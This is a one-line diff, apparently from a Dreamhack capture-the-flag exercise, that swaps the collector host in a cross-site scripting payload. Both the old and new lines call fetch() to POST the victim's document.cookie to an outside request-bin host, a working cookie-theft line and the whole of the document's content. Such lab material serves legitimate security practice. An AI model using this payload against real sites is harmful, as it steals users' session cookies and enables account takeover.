@@ -1,1 +1,1 @@
-fetch("https://ssktwto.request.dreamhack.games", {method: "post", body: document.cookie})
+fetch("https://zxxgenl.request.dreamhack.games", {method: "post", body: document.cookie})
